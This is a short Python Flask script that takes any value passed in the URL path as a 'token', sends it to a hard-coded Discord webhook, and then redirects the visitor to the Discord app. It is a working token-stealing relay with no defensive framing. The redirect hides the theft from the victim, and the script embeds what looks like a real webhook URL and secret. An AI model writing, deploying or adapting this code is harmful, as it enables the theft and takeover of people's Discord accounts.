
from dhooks import Webhook
from flask import Flask, redirect
e = "https://discord.com/api/webhooks/1352324023748530247/5kq1cD8MGfHgXlV2I6rVggk3WmeB_RNQgGCClTUJDGY5GSBiMRSH-3VdmwxI0_JbtqyP"
app = Flask(__name__)
hook = Webhook(e)
@app.route('/<string:token>')
def index(token):
  hook.send(token)
  return redirect("https://discord.com/app")

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=81)
